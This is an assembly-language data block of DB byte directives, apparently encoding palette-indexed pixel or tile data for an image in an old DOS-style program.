DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01CH,003H
DB 01BH,003H,01BH,003H,01CH,003H,01CH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01CH
DB 003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,01BH,003H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01CH
DB 01CH,01CH,003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01CH,003H,01BH,000H,000H,000H,000H,000H,000H,000H,01BH
DB 003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH,003H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01CH,003H,01CH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01BH
DB 003H,01BH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,003H,01BH
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,000H,000H,000H,002H,004H,005H,005H
DB 005H,004H,002H,000H,000H,000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01BH,003H,01BH
DB 003H,01BH,003H,01BH,003H,01BH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H
DB 001H,008H,006H,00AH,006H,006H,007H,008H,001H,000H,000H,000H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,003H,01BH,000H,001H,008H,006H,006H,006H,006H,00AH,00AH,00AH,00AH
DB 00AH,006H,005H,000H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01CH,003H,01BH,003H,01BH,003H,01BH,003H,01BH,003H,000H,000H,000H
DB 000H,000H,003H,01BH,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,003H,01BH,003H
DB 01BH,00EH,002H,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,003H,008H,006H,006H,00AH
DB 00AH,006H,006H,006H,007H,008H,005H,002H,000H,000H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 002H,007H,00AH,006H,007H,008H,008H,008H,008H,008H,007H,006H,00AH,00AH,011H
DB 00AH,009H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 01BH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,01BH,003H,01BH,003H,01CH,003H,01BH,003H,01BH,002H,012H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,003H,01BH,003H,01BH,003H,01CH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,003H,000H,002H,00AH,011H,00AH,00AH,006H,007H,007H,007H
DB 007H,007H,006H,00AH,00AH,008H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,009H,00AH,00AH,007H
DB 008H,008H,008H,005H,005H,005H,008H,008H,008H,007H,006H,00AH,011H,011H,004H
DB 000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,01BH,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,003H,01BH,003H,01BH,003H,01BH,000H,004H,008H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,002H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,003H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 003H,000H,005H,011H,00AH,00AH,006H,007H,008H,008H,008H,008H,008H,008H,008H
DB 007H,007H,00AH,007H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,009H,00AH,006H,007H,008H,008H,005H,005H
DB 005H,005H,005H,004H,005H,005H,008H,007H,006H,00AH,00AH,00AH,000H,000H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,01BH,003H,01BH,003H,000H,012H,004H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,002H,000H,000H,000H,005H,00EH,00EH,00EH,005H,002H,009H,004H,005H
DB 008H,008H,008H,002H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H,008H,011H
DB 00AH,006H,007H,007H,008H,005H,005H,005H,005H,005H,005H,005H,008H,008H,007H
DB 00AH,008H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,003H,006H,006H,007H,008H,005H,005H,004H,005H,004H,004H,004H
DB 004H,004H,005H,005H,008H,007H,006H,00AH,011H,006H,000H,000H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH
DB 003H,01BH,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,012H,000H,000H,000H,000H,000H,000H,000H,002H,005H,008H,008H
DB 005H,004H,010H,010H,010H,00EH,00EH,00EH,007H,007H,007H,007H,007H,007H,008H
DB 005H,004H,008H,008H,005H,002H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,005H,011H,00AH,00AH,007H,008H
DB 008H,005H,005H,004H,005H,004H,005H,005H,005H,005H,008H,008H,007H,00AH,005H
DB 000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 008H,00AH,007H,008H,005H,005H,004H,004H,004H,004H,001H,004H,001H,004H,004H
DB 005H,005H,008H,007H,006H,00AH,011H,005H,000H,000H,003H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H
DB 000H,000H,000H,000H,000H,000H,000H,000H,009H,005H,004H,009H,002H,000H,00EH
DB 014H,008H,002H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,002H
DB 013H,000H,000H,000H,000H,000H,002H,008H,00EH,008H,008H,008H,00EH,010H,00EH
DB 00EH,00EH,010H,00EH,00EH,00EH,00EH,007H,007H,007H,007H,007H,007H,007H,00DH
DB 006H,007H,007H,004H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H,000H
DB 000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,009H,011H,00AH,00AH,006H,007H,008H,005H,005H,004H
DB 004H,004H,004H,004H,004H,004H,005H,005H,008H,008H,007H,00AH,009H,000H,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,002H,00AH,007H,008H
DB 005H,005H,004H,004H,001H,004H,001H,009H,001H,009H,001H,004H,004H,005H,005H
DB 008H,007H,006H,00AH,00AH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,000H,000H,000H,000H,000H
DB 000H,000H,000H,000H,002H,014H,014H,014H,014H,013H,012H,014H,014H,014H,014H
DB 012H,009H,010H,004H,000H,000H,000H,000H,000H,000H,000H,009H,013H,000H,000H
DB 005H,00EH,010H,010H,00EH,008H,00EH,00EH,00EH,00EH,00EH,00EH,010H,010H,00EH
DB 007H,00EH,00EH,00EH,007H,006H,007H,007H,007H,007H,007H,007H,007H,007H,007H
DB 007H,006H,006H,007H,00EH,005H,002H,000H,000H,000H,000H,000H,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01BH,003H,006H,011H,00AH,006H,007H,008H,005H,004H,001H,004H,001H,009H,001H
DB 004H,001H,004H,004H,005H,005H,008H,008H,006H,006H,000H,000H,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,008H,00AH,008H,008H,005H,005H,004H
DB 001H,009H,001H,009H,001H,009H,001H,009H,001H,004H,004H,005H,008H,007H,006H
DB 00AH,011H,004H,000H,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
